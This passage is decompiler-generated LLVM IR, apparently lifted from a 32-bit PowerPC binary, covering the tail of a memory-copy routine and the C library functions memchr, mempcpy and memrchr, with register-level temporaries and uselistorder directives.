  %v0_10011f80 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011f80 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011f80 = add i32 %v1_10011f80, -8
  %v3_10011f80 = inttoptr i32 %v2_10011f80 to i32*
  store i32 %v0_10011f80, i32* %v3_10011f80, align 4
  store i32 %v2_10011f80, i32* %r10.global-to-local, align 4
  %v0_10011f84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011f84 = add i32 %v0_10011f84, -1
  store i32 %v1_10011f84, i32* %ctr.global-to-local, align 4
  %v2_10011f84 = icmp eq i32 %v1_10011f84, 0
  br i1 %v2_10011f84, label %dec_label_pc_10011f88, label %dec_label_pc_10011f74

dec_label_pc_10011f88:                            ; preds = %dec_label_pc_10011f74, %dec_label_pc_10011fd4, %dec_label_pc_10011f58
  %v0_10011f88 = load i32, i32* @r11, align 4
  %v1_10011f88 = urem i32 %v0_10011f88, 8
  store i32 %v1_10011f88, i32* %r5.global-to-local, align 4
  %tmp = icmp ult i32 %v1_10011f88, 4
  br i1 %tmp, label %dec_label_pc_10011fa0, label %dec_label_pc_10011f94

dec_label_pc_10011f94:                            ; preds = %dec_label_pc_10011f88
  %v0_10011f94 = load i32, i32* %r4.global-to-local, align 4
  %v1_10011f94 = add i32 %v0_10011f94, -4
  %v2_10011f94 = inttoptr i32 %v1_10011f94 to i32*
  %v3_10011f94 = load i32, i32* %v2_10011f94, align 4
  store i32 %v1_10011f94, i32* %r4.global-to-local, align 4
  %v1_10011f98 = add nsw i32 %v1_10011f88, -4
  store i32 %v1_10011f98, i32* %r5.global-to-local, align 4
  %v1_10011f9c = load i32, i32* %r10.global-to-local, align 4
  %v2_10011f9c = add i32 %v1_10011f9c, -4
  %v3_10011f9c = inttoptr i32 %v2_10011f9c to i32*
  store i32 %v3_10011f94, i32* %v3_10011f9c, align 4
  store i32 %v2_10011f9c, i32* %r10.global-to-local, align 4
  %v0_10011fa0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011fa0

dec_label_pc_10011fa0:                            ; preds = %dec_label_pc_10011f88, %dec_label_pc_10011f94
  %v0_10011fa8 = phi i32 [ %v1_10011f88, %dec_label_pc_10011f88 ], [ %v0_10011fa0.pre, %dec_label_pc_10011f94 ]
  %v3_10011fa0 = icmp eq i32 %v0_10011fa8, 0
  br i1 %v3_10011fa0, label %dec_label_pc_10011fe0, label %dec_label_pc_10011fa8

dec_label_pc_10011fa8:                            ; preds = %dec_label_pc_10011fa0
  store i32 %v0_10011fa8, i32* %ctr.global-to-local, align 4
  %v2_10011fb0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011fac

dec_label_pc_10011fac:                            ; preds = %dec_label_pc_10011fac, %dec_label_pc_10011fa8
  %v2_10011fb0 = phi i32 [ %v3_10011fb0, %dec_label_pc_10011fac ], [ %v2_10011fb0.pre, %dec_label_pc_10011fa8 ]
  %v0_10011fac = load i32, i32* %r4.global-to-local, align 4
  %v1_10011fac = add i32 %v0_10011fac, -1
  %v2_10011fac = inttoptr i32 %v1_10011fac to i8*
  %v3_10011fac = load i8, i8* %v2_10011fac, align 1
  store i32 %v1_10011fac, i32* %r4.global-to-local, align 4
  %v3_10011fb0 = add i32 %v2_10011fb0, -1
  %v4_10011fb0 = inttoptr i32 %v3_10011fb0 to i8*
  store i8 %v3_10011fac, i8* %v4_10011fb0, align 1
  store i32 %v3_10011fb0, i32* %r10.global-to-local, align 4
  %v0_10011fb4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011fb4 = add i32 %v0_10011fb4, -1
  store i32 %v1_10011fb4, i32* %ctr.global-to-local, align 4
  %v2_10011fb4 = icmp eq i32 %v1_10011fb4, 0
  br i1 %v2_10011fb4, label %dec_label_pc_10011fe0, label %dec_label_pc_10011fac

dec_label_pc_10011fbc:                            ; preds = %dec_label_pc_10011f68
  %v1_10011fbc = sub nsw i32 4, %v1_10011f68
  store i32 %v1_10011fbc, i32* %ctr.global-to-local, align 4
  %v2_10011fc4 = sub i32 %v1_10011f5c, %v1_10011fbc
  store i32 %v2_10011fc4, i32* @r11, align 4
  %v1_10011fc89 = add i32 %v2_10011f5c, -1
  %v2_10011fc810 = inttoptr i32 %v1_10011fc89 to i8*
  %v3_10011fc811 = load i8, i8* %v2_10011fc810, align 1
  store i32 %v1_10011fc89, i32* %r4.global-to-local, align 4
  %v3_10011fcc13 = add i32 %v2_10011f60, -1
  %v4_10011fcc14 = inttoptr i32 %v3_10011fcc13 to i8*
  store i8 %v3_10011fc811, i8* %v4_10011fcc14, align 1
  store i32 %v3_10011fcc13, i32* %r10.global-to-local, align 4
  %v0_10011fd015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011fd016 = add i32 %v0_10011fd015, -1
  store i32 %v1_10011fd016, i32* %ctr.global-to-local, align 4
  %v2_10011fd017 = icmp eq i32 %v1_10011fd016, 0
  br i1 %v2_10011fd017, label %dec_label_pc_10011fd4, label %dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge

dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge: ; preds = %dec_label_pc_10011fbc, %dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge
  %v3_10011fcc18 = phi i32 [ %v3_10011fcc, %dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge ], [ %v3_10011fcc13, %dec_label_pc_10011fbc ]
  %v0_10011fc8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10011fc8 = add i32 %v0_10011fc8.pre, -1
  %v2_10011fc8 = inttoptr i32 %v1_10011fc8 to i8*
  %v3_10011fc8 = load i8, i8* %v2_10011fc8, align 1
  store i32 %v1_10011fc8, i32* %r4.global-to-local, align 4
  %v3_10011fcc = add i32 %v3_10011fcc18, -1
  %v4_10011fcc = inttoptr i32 %v3_10011fcc to i8*
  store i8 %v3_10011fc8, i8* %v4_10011fcc, align 1
  store i32 %v3_10011fcc, i32* %r10.global-to-local, align 4
  %v0_10011fd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011fd0 = add i32 %v0_10011fd0, -1
  store i32 %v1_10011fd0, i32* %ctr.global-to-local, align 4
  %v2_10011fd0 = icmp eq i32 %v1_10011fd0, 0
  br i1 %v2_10011fd0, label %dec_label_pc_10011fd4, label %dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge

dec_label_pc_10011fd4:                            ; preds = %dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge, %dec_label_pc_10011fbc
  %v0_10011fd4 = load i32, i32* @r11, align 4
  %v1_10011fd4 = call i32 @__asm_rlwinm.(i32 %v0_10011fd4, i32 29, i32 3, i32 31)
  store i32 %v1_10011fd4, i32* %r9.global-to-local, align 4
  %v4_10011fd4 = icmp eq i32 %v1_10011fd4, 0
  br i1 %v4_10011fd4, label %dec_label_pc_10011f88, label %dec_label_pc_10011fd4.dec_label_pc_10011f70_crit_edge

dec_label_pc_10011fd4.dec_label_pc_10011f70_crit_edge: ; preds = %dec_label_pc_10011fd4
  %v1_10011f7c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011f70

dec_label_pc_10011fe0:                            ; preds = %dec_label_pc_10011fac, %dec_label_pc_10011fa0
  %v0_10011fe0 = load i32, i32* %r8.global-to-local, align 4
  ret i32 %v0_10011fe0

; uselistorder directives
  uselistorder i32 %v1_10011fd4, { 1, 2, 0 }
  uselistorder i32 %v1_10011fd0, { 1, 0 }
  uselistorder i32 %v3_10011fcc, { 1, 2, 0 }
  uselistorder i32 %v1_10011fb4, { 1, 0 }
  uselistorder i32 %v3_10011fb0, { 1, 2, 0 }
  uselistorder i32 %v1_10011f88, { 3, 2, 1, 0 }
  uselistorder i32 %v1_10011f84, { 1, 0 }
  uselistorder i32 %v2_10011f80, { 1, 2, 0 }
  uselistorder i32 %v1_10011f68, { 1, 0 }
  uselistorder i32 %v2_10011f60, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10011f5c, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 9, 1, 6, 2, 8, 3, 7, 4 }
  uselistorder i32* %r10.global-to-local, { 5, 0, 9, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32* %ctr.global-to-local, { 0, 9, 10, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -8, { 6, 7, 2, 8, 1, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 1, 2, 0, 5, 6, 3, 4 }
  uselistorder i32* @r11, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_10011fc8.dec_label_pc_10011fc8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10011fa0, { 1, 0 }
  uselistorder label %dec_label_pc_10011f88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011f58, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10011fec = urem i32 %arg1, 256
  store i32 %v1_10011fec, i32* %r4.global-to-local, align 4
  %v0_1001200c7 = load i32, i32* @r3, align 4
  store i32 %arg2, i32* %ctr.global-to-local, align 4
  %v2_1001201013 = icmp eq i32 %arg2, 0
  br i1 %v2_1001201013, label %dec_label_pc_10012018, label %dec_label_pc_10012014

dec_label_pc_10011ff8:                            ; preds = %dec_label_pc_10012014
  %v1_10011ff8 = inttoptr i32 %v0_10011ff8 to i8*
  %v2_10011ff8 = load i8, i8* %v1_10011ff8, align 1
  %v3_10011ff8 = zext i8 %v2_10011ff8 to i32
  %v0_10011ffc = load i32, i32* %r5.global-to-local, align 4
  %v1_10011ffc = add i32 %v0_10011ffc, -1
  store i32 %v1_10011ffc, i32* %r5.global-to-local, align 4
  %v1_10012000 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012000 = icmp eq i32 %v3_10011ff8, %v1_10012000
  %v0_10012004 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012000, i32 %v0_10012004)
  %v0_10012008 = load i32, i32* @r3, align 4
  %v1_10012008 = add i32 %v0_10012008, 1
  store i32 %v1_10012008, i32* @r3, align 4
  %v0_10012010 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012010 = add i32 %v0_10012010, -1
  store i32 %v1_10012010, i32* %ctr.global-to-local, align 4
  %v2_10012010 = icmp eq i32 %v1_10012010, 0
  br i1 %v2_10012010, label %dec_label_pc_10012018.loopexit, label %dec_label_pc_10012014

dec_label_pc_10012014:                            ; preds = %entry, %dec_label_pc_10011ff8
  %v0_10011ff8 = phi i32 [ %v1_10012008, %dec_label_pc_10011ff8 ], [ %v0_1001200c7, %entry ]
  %v0_10012014.in.in = phi i32 [ %v1_10012008, %dec_label_pc_10011ff8 ], [ %v0_1001200c7, %entry ]
  %v0_10012014.in = urem i32 %v0_10012014.in.in, 4
  %v0_10012014 = icmp eq i32 %v0_10012014.in, 0
  br i1 %v0_10012014, label %dec_label_pc_10012018.loopexit, label %dec_label_pc_10011ff8

dec_label_pc_10012018.loopexit:                   ; preds = %dec_label_pc_10012014, %dec_label_pc_10011ff8
  %v0_1001204016.ph = phi i32 [ %v1_10012008, %dec_label_pc_10011ff8 ], [ %v0_10011ff8, %dec_label_pc_10012014 ]
  %v0_10012018.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_1001201c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012018

dec_label_pc_10012018:                            ; preds = %dec_label_pc_10012018.loopexit, %entry
  %v0_1001201c = phi i32 [ 0, %entry ], [ %v0_1001201c.pre, %dec_label_pc_10012018.loopexit ]
  %v0_10012018 = phi i32 [ %v1_10011fec, %entry ], [ %v0_10012018.pre, %dec_label_pc_10012018.loopexit ]
  %v0_1001204016 = phi i32 [ %v0_1001200c7, %entry ], [ %v0_1001204016.ph, %dec_label_pc_10012018.loopexit ]
  %v1_10012018 = mul i32 %v0_10012018, 256
  %v1_1001201c = udiv i32 %v0_1001201c, 4
  %v2_10012020 = or i32 %v1_10012018, %v0_10012018
  %v1_10012028 = mul i32 %v2_10012020, 65536
  %v2_10012034 = or i32 %v1_10012028, %v2_10012020
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_1001201c, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1001201c, 4
  br i1 %tmp, label %dec_label_pc_100120c8, label %dec_label_pc_10012040

dec_label_pc_10012040:                            ; preds = %dec_label_pc_10012018, %dec_label_pc_100120c4.backedge
  %v0_100120c4 = phi i32 [ %v1_100120c4, %dec_label_pc_100120c4.backedge ], [ %v1_1001201c, %dec_label_pc_10012018 ]
  %v0_10012048 = phi i32 [ %v1_10012048, %dec_label_pc_100120c4.backedge ], [ %v0_1001201c, %dec_label_pc_10012018 ]
  %v0_10012080 = phi i32 [ %v1_10012044, %dec_label_pc_100120c4.backedge ], [ %v0_1001204016, %dec_label_pc_10012018 ]
  %v1_10012040 = inttoptr i32 %v0_10012080 to i32*
  %v2_10012040 = load i32, i32* %v1_10012040, align 4
  %v1_10012044 = add i32 %v0_10012080, 4
  store i32 %v1_10012044, i32* @r3, align 4
  %v1_10012048 = add i32 %v0_10012048, -4
  store i32 %v1_10012048, i32* %r5.global-to-local, align 4
  %v1_1001204c = add i32 %v0_10012080, 1
  %v2_10012050 = xor i32 %v2_10012040, %v2_10012034
  %v1_10012058 = add i32 %v2_10012050, 2130640639
  %v2_1001205c = xor i32 %v1_10012058, %v2_10012050
  %v2_10012060 = and i32 %v2_1001205c, -2130640640
  %v6_10012060 = icmp eq i32 %v2_10012060, -2130640640
  br i1 %v6_10012060, label %dec_label_pc_100120c4.backedge, label %dec_label_pc_1001206c

dec_label_pc_100120c4.backedge:                   ; preds = %dec_label_pc_10012040, %dec_label_pc_100120b0
  %v1_100120c4 = add i32 %v0_100120c4, -1
  store i32 %v1_100120c4, i32* %ctr.global-to-local, align 4
  %v2_100120c4 = icmp eq i32 %v1_100120c4, 0
  br i1 %v2_100120c4, label %dec_label_pc_100120c8, label %dec_label_pc_10012040

dec_label_pc_1001206c:                            ; preds = %dec_label_pc_10012040
  %v2_1001206c = inttoptr i32 %v0_10012080 to i8*
  %v3_1001206c = load i8, i8* %v2_1001206c, align 1
  %v4_1001206c = zext i8 %v3_1001206c to i32
  %v1_10012070 = add i32 %v0_10012080, 3
  store i32 %v1_10012070, i32* @r8, align 4
  %v1_10012074 = add i32 %v0_10012080, 2
  %v4_10012078 = icmp eq i32 %v4_1001206c, %v0_10012018
  br i1 %v4_10012078, label %dec_label_pc_10012080, label %dec_label_pc_10012088

dec_label_pc_10012080:                            ; preds = %dec_label_pc_1001206c
  ret i32 %v0_10012080

dec_label_pc_10012088:                            ; preds = %dec_label_pc_1001206c
  %v2_10012088 = inttoptr i32 %v1_1001204c to i8*
  %v3_10012088 = load i8, i8* %v2_10012088, align 1
  %v4_10012088 = zext i8 %v3_10012088 to i32
  %v4_1001208c = icmp eq i32 %v4_10012088, %v0_10012018
  br i1 %v4_1001208c, label %dec_label_pc_10012094, label %dec_label_pc_1001209c

dec_label_pc_10012094:                            ; preds = %dec_label_pc_10012088
  ret i32 %v1_1001204c

dec_label_pc_1001209c:                            ; preds = %dec_label_pc_10012088
  %v2_1001209c = inttoptr i32 %v1_10012074 to i8*
  %v3_1001209c = load i8, i8* %v2_1001209c, align 1
  %v4_1001209c = zext i8 %v3_1001209c to i32
  %v4_100120a0 = icmp eq i32 %v4_1001209c, %v0_10012018
  br i1 %v4_100120a0, label %dec_label_pc_100120a8, label %dec_label_pc_100120b0

dec_label_pc_100120a8:                            ; preds = %dec_label_pc_1001209c
  ret i32 %v1_10012074

dec_label_pc_100120b0:                            ; preds = %dec_label_pc_1001209c
  %v2_100120b0 = inttoptr i32 %v1_10012070 to i8*
  %v3_100120b0 = load i8, i8* %v2_100120b0, align 1
  %v4_100120b0 = zext i8 %v3_100120b0 to i32
  %v4_100120b4 = icmp eq i32 %v4_100120b0, %v0_10012018
  br i1 %v4_100120b4, label %dec_label_pc_100120bc, label %dec_label_pc_100120c4.backedge

dec_label_pc_100120bc:                            ; preds = %dec_label_pc_100120b0
  ret i32 %v1_10012070

dec_label_pc_100120c8:                            ; preds = %dec_label_pc_100120c4.backedge, %dec_label_pc_10012018
  %v0_100120d426 = phi i32 [ %v0_1001204016, %dec_label_pc_10012018 ], [ %v1_10012044, %dec_label_pc_100120c4.backedge ]
  %v0_100120c8 = phi i32 [ %v0_1001201c, %dec_label_pc_10012018 ], [ %v1_10012048, %dec_label_pc_100120c4.backedge ]
  %v1_100120c8 = add i32 %v0_100120c8, 1
  store i32 %v1_100120c8, i32* %r5.global-to-local, align 4
  store i32 %v0_100120c8, i32* %ctr.global-to-local, align 4
  %v2_100120e43 = icmp eq i32 %v0_100120c8, 0
  br i1 %v2_100120e43, label %dec_label_pc_100120e8, label %dec_label_pc_100120d4

dec_label_pc_100120d4:                            ; preds = %dec_label_pc_100120c8, %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge
  %v1_100120d8 = phi i32 [ %v1_100120d8.pre, %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge ], [ %v0_10012018, %dec_label_pc_100120c8 ]
  %v0_100120d4 = phi i32 [ %v1_100120e0, %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge ], [ %v0_100120d426, %dec_label_pc_100120c8 ]
  %v1_100120d4 = inttoptr i32 %v0_100120d4 to i8*
  %v2_100120d4 = load i8, i8* %v1_100120d4, align 1
  %v3_100120d4 = zext i8 %v2_100120d4 to i32
  %v4_100120d8 = icmp eq i32 %v3_100120d4, %v1_100120d8
  %v0_100120dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100120d8, i32 %v0_100120dc)
  %v0_100120e0 = load i32, i32* @r3, align 4
  %v1_100120e0 = add i32 %v0_100120e0, 1
  store i32 %v1_100120e0, i32* @r3, align 4
  %v0_100120e4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100120e4 = add i32 %v0_100120e4, -1
  store i32 %v1_100120e4, i32* %ctr.global-to-local, align 4
  %v2_100120e4 = icmp eq i32 %v1_100120e4, 0
  br i1 %v2_100120e4, label %dec_label_pc_100120e8, label %dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge

dec_label_pc_100120d4.dec_label_pc_100120d4_crit_edge: ; preds = %dec_label_pc_100120d4
  %v1_100120d8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100120d4

dec_label_pc_100120e8:                            ; preds = %dec_label_pc_100120d4, %dec_label_pc_100120c8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_100120e4, { 1, 0 }
  uselistorder i32 %v1_100120e0, { 1, 0 }
  uselistorder i32 %v0_100120c8, { 1, 2, 0 }
  uselistorder i32 %v1_100120c4, { 2, 1, 0 }
  uselistorder i32 %v1_10012048, { 0, 2, 1 }
  uselistorder i32 %v1_10012044, { 0, 2, 1 }
  uselistorder i32 %v0_10012080, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10012020, { 1, 0 }
  uselistorder i32 %v1_1001201c, { 1, 0 }
  uselistorder i32 %v0_1001204016, { 1, 0 }
  uselistorder i32 %v0_10012018, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_1001201c, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10012010, { 1, 0 }
  uselistorder i32 %v1_10012008, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1001200c7, { 2, 0, 1 }
  uselistorder i32 %v1_10011fec, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100120d4, { 1, 0 }
  uselistorder label %dec_label_pc_100120c4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10012040, { 1, 0 }
  uselistorder label %dec_label_pc_10012014, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268509452, i32* @lr, align 4
  %v0_10012108 = call i32 @memcpy()
  %v0_10012110 = load i32, i32* @r28, align 4
  %v1_10012110 = load i32, i32* @r29, align 4
  %v2_10012110 = add i32 %v1_10012110, %v0_10012110
  ret i32 %v2_10012110
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10012128 = urem i32 %arg2, 256
  store i32 %v1_10012128, i32* %r4.global-to-local, align 4
  %v2_10012130 = add i32 %arg3, %arg1
  store i32 %v2_10012130, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_1001214c13 = icmp eq i32 %arg3, 0
  br i1 %v2_1001214c13, label %dec_label_pc_10012154, label %dec_label_pc_10012150

dec_label_pc_10012138:                            ; preds = %dec_label_pc_10012150
  %v1_10012138 = add i32 %v0_10012138, -1
  %v2_10012138 = inttoptr i32 %v1_10012138 to i8*
  %v3_10012138 = load i8, i8* %v2_10012138, align 1
  %v4_10012138 = zext i8 %v3_10012138 to i32
  store i32 %v1_10012138, i32* %r3.global-to-local, align 4
  %v0_1001213c = load i32, i32* %r5.global-to-local, align 4
  %v1_1001213c = add i32 %v0_1001213c, -1
  store i32 %v1_1001213c, i32* %r5.global-to-local, align 4
  %v1_10012140 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012140 = icmp eq i32 %v4_10012138, %v1_10012140
  %v0_10012144 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012140, i32 %v0_10012144)
  %v0_10012148 = load i32, i32* %r3.global-to-local, align 4
  %v0_1001214c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001214c = add i32 %v0_1001214c, -1
  store i32 %v1_1001214c, i32* %ctr.global-to-local, align 4
  %v2_1001214c = icmp eq i32 %v1_1001214c, 0
  br i1 %v2_1001214c, label %dec_label_pc_10012154.loopexit, label %dec_label_pc_10012150

dec_label_pc_10012150:                            ; preds = %entry, %dec_label_pc_10012138
  %v0_10012138 = phi i32 [ %v0_10012148, %dec_label_pc_10012138 ], [ %v2_10012130, %entry ]
  %v0_10012150.in.in = phi i32 [ %v0_10012148, %dec_label_pc_10012138 ], [ %v2_10012130, %entry ]
  %v0_10012150.in = urem i32 %v0_10012150.in.in, 4
  %v0_10012150 = icmp eq i32 %v0_10012150.in, 0
  br i1 %v0_10012150, label %dec_label_pc_10012154.loopexit, label %dec_label_pc_10012138

dec_label_pc_10012154.loopexit:                   ; preds = %dec_label_pc_10012150, %dec_label_pc_10012138
  %v0_1001217c16.ph = phi i32 [ %v0_10012148, %dec_label_pc_10012138 ], [ %v0_10012138, %dec_label_pc_10012150 ]
  %v0_10012154.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10012158.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012154

dec_label_pc_10012154:                            ; preds = %dec_label_pc_10012154.loopexit, %entry
  %v0_10012158 = phi i32 [ 0, %entry ], [ %v0_10012158.pre, %dec_label_pc_10012154.loopexit ]
  %v0_10012154 = phi i32 [ %v1_10012128, %entry ], [ %v0_10012154.pre, %dec_label_pc_10012154.loopexit ]
  %v0_1001217c16 = phi i32 [ %v2_10012130, %entry ], [ %v0_1001217c16.ph, %dec_label_pc_10012154.loopexit ]
  %v1_10012154 = mul i32 %v0_10012154, 256
  %v1_10012158 = udiv i32 %v0_10012158, 4
  %v2_1001215c = or i32 %v1_10012154, %v0_10012154
  %v1_10012164 = mul i32 %v2_1001215c, 65536
  %v2_10012170 = or i32 %v1_10012164, %v2_1001215c
  store i32 %v2_10012170, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10012158, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10012158, 4
  br i1 %tmp, label %dec_label_pc_100121f4, label %dec_label_pc_1001217c

dec_label_pc_1001217c:                            ; preds = %dec_label_pc_10012154, %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge
  %v0_100121f021 = phi i32 [ %v1_100121f0, %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge ], [ %v1_10012158, %dec_label_pc_10012154 ]
  %v0_1001219c = phi i32 [ %v0_1001219c.pre, %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge ], [ -2130640640, %dec_label_pc_10012154 ]
  %v0_10012184 = phi i32 [ %v0_10012184.pre, %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge ], [ %v2_10012170, %dec_label_pc_10012154 ]
  %v0_10012180 = phi i32 [ %v0_10012180.pre, %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge ], [ %v0_10012158, %dec_label_pc_10012154 ]
  %v0_1001217c = phi i32 [ %v0_1001217c.pre, %dec_label_pc_100121f0.backedge.dec_label_pc_1001217c_crit_edge ], [ %v0_1001217c16, %dec_label_pc_10012154 ]
  %v1_1001217c = add i32 %v0_1001217c, -4
  %v2_1001217c = inttoptr i32 %v1_1001217c to i32*
  %v3_1001217c = load i32, i32* %v2_1001217c, align 4
  store i32 %v1_1001217c, i32* %r3.global-to-local, align 4
  %v1_10012180 = add i32 %v0_10012180, -4
  store i32 %v1_10012180, i32* %r5.global-to-local, align 4
  %v2_10012184 = xor i32 %v3_1001217c, %v0_10012184
  %v1_10012188 = add i32 %v0_1001217c, -3
  %v1_10012190 = add i32 %v2_10012184, 2130640639
  %v1_10012198 = add i32 %v0_1001217c, -2
  %v2_10012194 = sub i32 -1, %v2_10012184
  %v2_1001219c = xor i32 %v1_10012190, %v2_10012194
  %v3_1001219c = and i32 %v2_1001219c, %v0_1001219c
  %v6_1001219c = icmp eq i32 %v3_1001219c, 0
  %v1_100121a0 = add i32 %v0_1001217c, -1
  br i1 %v6_1001219c, label %dec_label_pc_100121f0.backedge, label %dec_label_pc_100121a8

dec_label_pc_100121a8:                            ; preds = %dec_label_pc_1001217c
  %v2_100121a8 = inttoptr i32 %v1_100121a0 to i8*
  %v3_100121a8 = load i8, i8* %v2_100121a8, align 1
  %v4_100121a8 = zext i8 %v3_100121a8 to i32
  %v1_100121ac = load i32, i32* %r4.global-to-local, align 4
  %v4_100121ac = icmp eq i32 %v4_100121a8, %v1_100121ac
  br i1 %v4_100121ac, label %dec_label_pc_100121b4, label %dec_label_pc_100121bc

dec_label_pc_100121b4:                            ; preds = %dec_label_pc_100121a8
  store i32 %v1_100121a0, i32* %r3.global-to-local, align 4
  ret i32 %v1_100121a0

dec_label_pc_100121bc:                            ; preds = %dec_label_pc_100121a8
  %v2_100121bc = inttoptr i32 %v1_10012198 to i8*
  %v3_100121bc = load i8, i8* %v2_100121bc, align 1
  %v4_100121bc = zext i8 %v3_100121bc to i32
  %v4_100121c0 = icmp eq i32 %v4_100121bc, %v1_100121ac
  br i1 %v4_100121c0, label %dec_label_pc_100121c8, label %dec_label_pc_100121d0

dec_label_pc_100121c8:                            ; preds = %dec_label_pc_100121bc
  store i32 %v1_10012198, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012198

dec_label_pc_100121d0:                            ; preds = %dec_label_pc_100121bc
  %v2_100121d0 = inttoptr i32 %v1_10012188 to i8*
  %v3_100121d0 = load i8, i8* %v2_100121d0, align 1
  %v4_100121d0 = zext i8 %v3_100121d0 to i32
  %v4_100121d4 = icmp eq i32 %v4_100121d0, %v1_100121ac
  br i1 %v4_100121d4, label %dec_label_pc_100121dc, label %dec_label_pc_100121e4

dec_label_pc_100121dc:                            ; preds = %dec_label_pc_100121d0
  store i32 %v1_10012188, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012188

dec_label_pc_100121e4:                            ; preds = %dec_label_pc_100121d0
  %v1_100121e4 = inttoptr i32 %v1_1001217c to i8*
  %v2_100121e4 = load i8, i8* %v1_100121e4, align 1
  %v3_100121e4 = zext i8 %v2_100121e4 to i32
  %v4_100121e8 = icmp eq i32 %v3_100121e4, %v1_100121ac
  %v0_100121ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100121e8, i32 %v0_100121ec)
  %v0_100121f0.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100121f0.backedge

dec_label_pc_100121f0.backedge:                   ; preds = %dec_label_pc_100121e4, %dec_label_pc_1001217c
  %v0_100121f0 = phi i32 [ %v0_100121f0.pre, %dec_label_pc_100121e4 ], [ %v0_100121f021, %dec_label_pc_1001217c ]
  %v1_100121f0 = add i32 %v0_100121f0, -1
  store i32 %v1_100121f0, i32* %ctr.global-to-local, align 4
  %v2_100121f0 = icmp eq i32 %v1_100121f0, 0
